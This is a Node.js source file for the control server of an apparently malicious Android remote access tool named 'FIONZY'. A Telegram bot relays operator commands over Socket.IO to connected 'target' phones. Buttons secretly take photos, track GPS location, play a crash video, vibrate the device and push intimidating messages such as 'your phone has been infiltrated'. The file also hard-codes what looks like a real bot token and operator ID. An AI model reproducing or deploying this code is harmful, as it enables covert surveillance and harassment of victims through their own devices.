const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

// === ⚡ KONFIGURASI (GANTI DI SINI!) ⚡ ===
const BOT_TOKEN = '8441186762:AAG-wyDQFlP6sGXdIe6nxdk1HuEuAAyszWA'; 
const bot = new Telegraf(BOT_TOKEN);
const MY_ID = '7373392803'; // ID Tuan Fionzy

// UI Menu Utama v10.0
const mainMenu = async (ctx) => {
    const text = `⚡ *FIONZY CONTROL PANEL v10\\.0* ⚡\n` +
                 `──────────────\n` +
                 `📱 *Status:* ONLINE\n` +
                 `💀 *Mode:* FIONZY-Z ACTIVE\n` +
                 `──────────────\n` +
                 `*Pilih Perintah Eksekusi:*`;
    const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('📸 Take Photo', 'snap'), Markup.button.callback('📍 Track GPS', 'gps')],
        [Markup.button.callback('💀 Crash Video', 'crash'), Markup.button.callback('📳 Vibrate', 'vibrate')],
        [Markup.button.callback('💬 Send Toast', 'ask_toast'), Markup.button.callback('🔄 Refresh', 'menu')]
    ]);
    try { await ctx.replyWithMarkdownV2(text, keyboard); } catch (e) { console.log("Error: " + e.message); }
};

// Notifikasi Target Online
io.on('connection', (socket) => {
    console.log('⚡ Target Terhubung!');
    bot.telegram.sendMessage(MY_ID, "⚠️ **TARGET TERDETEKSI!**\nSistem FionzyGpt telah mengunci perangkat.", { parse_mode: 'Markdown' }).catch(() => {});
});

bot.start((ctx) => mainMenu(ctx));
bot.command('menu', (ctx) => mainMenu(ctx));

// Handler Tombol
bot.action('snap', (ctx) => { ctx.answerCbQuery('📸 Memotret...').catch(() => {}); io.emit('command', '/snap'); });
bot.action('gps', (ctx) => { ctx.answerCbQuery('📍 Melacak GPS...').catch(() => {}); io.emit('command', '/gps'); });
bot.action('vibrate', (ctx) => { ctx.answerCbQuery('📳 Bergetar!').catch(() => {}); io.emit('command', '/vibrate'); });
bot.action('crash', (ctx) => { ctx.answerCbQuery('💀 Menjalankan Video Crash...').catch(() => {}); io.emit('command', '/crash'); });
bot.action('menu', (ctx) => mainMenu(ctx));
bot.action('ask_toast', (ctx) => ctx.reply("Ketik: `/toast [pesan]`\nContoh: `/toast HP ANDA DISUSUPI!`"));

bot.on('text', (ctx) => {
    if (ctx.message.text.startsWith('/toast ')) {
        io.emit('command', ctx.message.text);
        ctx.reply("✅ Toast Terkirim!");
    }
});

// Pelindung Server
process.on('uncaughtException', (err) => { console.log('❌ Error Dicegah: ' + err.message); });
server.listen(3000, '0.0.0.0', () => {
    console.log('⚡ FIONZY v10.0 LIVE');
    console.log('⚡ MENUNGGU TARGET...');
});
bot.launch();
